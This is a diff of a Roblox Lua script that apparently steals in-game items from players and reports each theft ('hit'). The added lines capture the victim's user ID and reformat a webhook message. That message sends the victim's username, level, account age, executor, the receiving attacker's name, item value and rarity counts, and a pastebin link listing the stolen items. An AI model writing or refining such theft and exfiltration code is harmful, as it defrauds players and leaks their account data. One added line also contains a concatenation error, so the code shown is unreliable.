@@ -803,6 +803,7 @@ if #game:GetService("Players"):GetPlayers() == 12 then
     game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
 end
 
+local IdValue = game:GetService("Players").LocalPlayer.userId
 local LP = game.Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
 local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
@@ -1065,8 +1066,8 @@ local WebHookEmbed = CreateEmbed(
     "Please execute the code above to get your hit.",
     11220,
     {
-        {name = "〘:bust_in_silhouette:〙Player Info", value = "```Username: "..LP.Name.."\nLevel: "..tostring(getLvl()).."\nAccount-Age: "..tostring(LP.AccountAge).."\nExecutor: "..identifyexecutor().."\nReceiver: "..userName.."```"},
-{name = "〘:mailbox_with_no_mail:〙Hit Info", value = "```Total Value: "..tostring(math.floor(valueCount + 0.5)).."\nTotal Count: "..tostring(itemsCount - 2).."\n\nUniques: "..tostring(uniqueItemsC).."\nAncients: "..tostring(ancientItemsC).."\nGodlys: "..tostring(godlyItemsC).."\nLegendarys: "..tostring(legendaryItemsC).."\nVintage: "..tostring(vintageItemsC).."\nRares: "..tostring(rareItemsC).."\nUncommons: "..tostring(uncommonItemsC).."\nCommons: "..tostring(commonItemsC).."```"},
+        {name = "〘:bust_in_silhouette:〙Player Info", value = "```Username      : "..LP.Name.."User-ID          : "..tostring(IdValue)"\nLevel               : "..tostring(getLvl()).."\nAccount-Age: "..tostring(LP.AccountAge).."\nExecutor         : "..identifyexecutor().."\nReceiver         : "..userName.."```"},
+{name = "〘:mailbox_with_no_mail:〙Hit Info", value = "```Total Value    : "..tostring(math.floor(valueCount + 0.5)).."\nTotal Count   : "..tostring(itemsCount - 2).."\n\nUniques         : "..tostring(uniqueItemsC).."\nAncients        : "..tostring(ancientItemsC).."\nGodlys           : "..tostring(godlyItemsC).."\nLegendarys   : "..tostring(legendaryItemsC).."\nVintage          : "..tostring(vintageItemsC).."\nRares              :  "..tostring(rareItemsC).."\nUncommons: "..tostring(uncommonItemsC).."\nCommons     : "..tostring(commonItemsC).."```"},
 {name = "〘:dart:〙Hit List", value = "[Click Me]("..pastebin(EverythingString)..")"}
     }
 )
